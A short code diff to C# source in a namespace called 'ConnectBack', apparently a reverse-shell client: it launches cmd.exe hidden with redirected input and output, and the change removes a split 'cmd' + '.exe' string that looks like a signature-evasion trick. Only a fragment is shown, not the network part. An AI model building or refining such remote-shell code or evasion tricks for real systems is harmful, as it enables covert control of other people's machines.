@@ -28,8 +28,7 @@ namespace ConnectBack
 						StringBuilder strInput = new StringBuilder();
 
 						Process p = new Process();
-						p.StartInfo.FileName = "cmd";
-						p.StartInfo.FileName=p.StartInfo.FileName + ".exe";
+						p.StartInfo.FileName = "cmd.exe";
 						p.StartInfo.CreateNoWindow = true;
 						p.StartInfo.UseShellExecute = false;
 						p.StartInfo.RedirectStandardOutput = true;
